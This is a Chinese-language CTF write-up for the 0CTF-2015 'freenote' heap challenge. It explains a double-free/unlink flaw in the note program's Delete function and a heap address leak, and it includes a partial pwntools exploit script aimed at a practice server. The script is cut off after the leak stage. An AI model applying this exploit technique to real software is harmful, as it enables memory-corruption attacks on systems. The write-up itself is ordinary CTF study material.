    题目来源 0CTF-2015

    题目分析

    Main函数

    结构体恢复

    New函数

    首先会搜索所有的Node找到第一个没有use的，然后读取长度并按照0x80(fastbin的最大值)对齐，最后分配空间，读取内容。

    Delete函数

    没有检测inuse位，导致了double free可以构造unlink

    Exploit

    坑点

    1. 0x80对齐
    2. 泄露堆地址：使用read的时候未增加0x00，先分配在释放，然后可以再分配，泄露出地址。

    Exp

    ```python= from pwn import *

    exe = './freenote_x64' host = 'node3.buuoj.cn' port = 27024 elf = ELF(exe) def DEBUG(bps = [], pie = False): cmd = 'set follow-fork-mode parent\ntracemalloc on\n' if pie: res = os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1] base = int(res.split(" ")[0], 16) cmd += ''.join(['b {:#x}\n'.format(b + base) for b in bps]) else: cmd += ''.join(['b {:#x}\n'.format(b) for b in bps]) if bps != []: cmd += 'c' gdb.attach(p, cmd)

    if not args.R: context.terminal = ['tmux', 'splitw', '-h'] # context.log_level = 'debug' p = process(exe) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') if args.D: DEBUG() else: p = remote(host,port) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    def New(s): p.sendlineafter(": ","2") p.sendlineafter(": ",str(len(s))) p.sendafter(": ",s)

    def Del(i): p.sendlineafter(": ","4") p.sendlineafter(": ",str(i))

    def Edit(i,s): p.sendlineafter(": ","3") p.sendlineafter(": ",str(i)) p.sendlineafter(": ",str(len(s))) p.sendafter(": ",s)

    def List(): p.sendlineafter(": ","1")

    def solve(): for i in range(4): New("/bin/sh\x00") Del(0) Del(2) New("12345678") List() p.recvuntil("12345678") note2_addr = u64(p.recvline()[:-1].ljust(8,'\x00')) log.info("note2_addr => 0x%x" % note2_addr) heap_addr = note2_addr - 0x90 - 0x90 - 0x1810 # 泄露地址 New("A")
